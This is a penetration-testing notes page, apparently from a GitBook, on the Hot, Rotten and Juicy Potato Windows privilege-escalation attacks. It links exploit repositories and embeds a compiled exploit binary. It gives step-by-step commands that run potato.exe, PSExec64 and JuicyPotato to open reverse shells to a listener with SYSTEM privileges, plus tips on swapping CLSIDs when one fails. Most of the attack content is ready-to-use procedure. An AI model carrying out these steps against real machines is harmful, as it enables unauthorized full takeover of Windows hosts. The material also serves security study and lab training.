# Potatos

## Hot Potato

Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

{% hint style="info" %}
These steps are for Windows 7, newer versions of windows 10 is not vulnerable.
{% endhint %}

the exploit can be found here:

{% embed url="https://github.com/Kevin-Robertson/Tater" %}

and here is the compiled binary exploit:

{% file src="../../../.gitbook/assets/potato.exe" %}

Run the exploit with your custom reverse shell:

```text
potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

Wait for a Windows Defender update, or trigger one manually.

Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

## Rotten Potato

The original Rotten Potato exploit was identified in 2016. Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled

## Juicy Potato

Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.

{% embed url="https://github.com/ohpe/juicy-potato" %}

{% hint style="info" %}
These steps are for Windows 7, newer versions of windows 10 is not vulnerable
{% endhint %}

Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows and start a listener.

Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:

```text
PSExec64.exe -i -u "ntauthority\local service" reverse.exe
```

Start another listener on Kali

Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:

```text
PrivEsc\JuicyPotato.exe -l 1337 -p reverse.exe  -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

{% hint style="info" %}
If the CLSID \({03ca...\) doesn’t work for you, either check this list:

[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
)

or run the GetCLSID.ps1 PowerShell script.
{% endhint %}

